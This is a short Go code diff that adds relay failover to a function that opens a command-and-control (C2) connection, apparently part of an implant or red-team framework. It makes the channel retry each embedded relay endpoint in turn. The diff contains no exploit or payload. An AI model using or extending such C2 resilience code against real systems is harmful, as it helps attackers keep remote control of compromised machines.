@@ -46,13 +46,32 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 			w.Jitter = common.RuntimeConfig.Jitter
 		}
 	}
-	logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)
 
-	rw, err := establishChannelStream(ctx, url, channelWrapper)
-	if err != nil {
-		nextRelayEndpoint(url)
-		cancel()
-		return nil, nil, nil, err
+	// Failover: try each relay endpoint at most once. On the first call
+	// the caller-provided URL is used; after a dial failure the address is
+	// rotated to the next embedded endpoint and the dial is retried. The
+	// loop terminates after trying all endpoints or on a non-network error.
+	tried := make(map[string]bool)
+	var rw io.ReadWriteCloser
+	for {
+		logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)
+
+		var dialErr error
+		rw, dialErr = establishChannelStream(ctx, url, channelWrapper)
+		if dialErr != nil {
+			tried[url] = true
+			nextRelayEndpoint(url)
+			nextURL := def.CCAddress
+			if nextURL == url || tried[nextURL] {
+				// all relay endpoints exhausted
+				cancel()
+				return nil, nil, nil, dialErr
+			}
+			logging.Warningf("relay %s unreachable, trying %s", maskURLSecret(url), maskURLSecret(nextURL))
+			url = nextURL
+			continue
+		}
+		break // dial succeeded
 	}
 
 	caps, capErr := normalizeMsgAuthCapabilities(capabilities)
